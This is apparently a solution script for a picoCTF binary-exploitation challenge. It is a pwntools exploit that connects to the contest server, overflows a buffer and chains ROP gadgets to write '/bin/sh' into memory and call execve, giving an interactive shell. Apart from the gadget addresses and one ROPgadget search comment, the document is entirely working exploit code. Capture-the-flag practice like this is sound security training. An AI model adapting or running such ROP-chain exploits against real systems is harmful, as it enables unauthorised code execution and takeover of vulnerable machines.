p_ebx = 0x08049022
p_eax = 0x080b074a

p_eadbx = 0x080583c8	# 0x080583c8 : pop eax ; pop edx ; pop ebx ; ret
p_ecx = 0x08049e39
int_call = 0x0804a3d2 
bin_sh = 0x80e5000
# /bin/sh\x00 write in start data rw-

writegadget = 0x0805a0d0
'''
ROPgadget --binary vuln | grep -E "mov dword ptr.*ret"
0x0805a0d0 : mov dword ptr [ecx + 0x1850], eax ; ret

'''

from pwn import *
# p = process('./vuln')
p = remote("saturn.picoctf.net", 52232)
elf = ELF('./vuln')
# gdb.attach(p)

p.recvuntil("grasshopper!")
payload = "A" * 0x1c 
payload += p32(p_eax) + "/bin"
payload += p32(p_ecx) + p32(bin_sh - 0x1850)
payload += p32(writegadget)
payload += p32(p_eax) + "/sh\x00"
payload += p32(p_ecx) + p32(bin_sh + 0x4 - 0x1850)
payload += p32(writegadget)
payload += p32(p_eadbx)
payload += p32(0x0b)
payload += p32(0x00)
payload += p32(bin_sh)
payload += p32(p_ecx)
payload += p32(0x00)
payload += p32(int_call)
p.sendline(payload) 

p.interactive()